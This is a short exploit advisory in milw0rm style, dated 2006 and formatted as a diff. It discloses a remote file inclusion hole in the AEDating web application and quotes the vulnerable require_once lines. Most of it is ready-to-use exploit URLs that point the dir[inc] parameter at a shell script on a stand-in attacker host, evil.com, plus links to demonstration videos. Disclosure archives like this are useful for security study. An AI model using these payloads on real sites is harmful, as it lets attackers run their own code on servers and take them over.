@@ -1,0 +1,19 @@
+AEDating (all versions) Remote File inclusion.
+
+Vulnerable code:
+
+/inc/design.inc.php
+/inc/admin_design.inc.php
+
+require_once( "$dir[inc]db.inc.php" );
+require_once( "$dir[inc]prof.inc.php" );
+
+Exploit:
+http://site.com/[script_path]/inc/design.inc.php?dir[inc]=http://evil.com/shell.txt?
+http://site.com/[script_path]/inc/admin_design.inc.php?dir[inc]=http://evil.com/shell.txt ?
+
+Video:
+http://rapidshare.de/files/33316468/AEDating_SQL.rar.html
+http://www.megaupload.com/?d=O1W4DX97
+
+# milw0rm.com [2006-09-16]
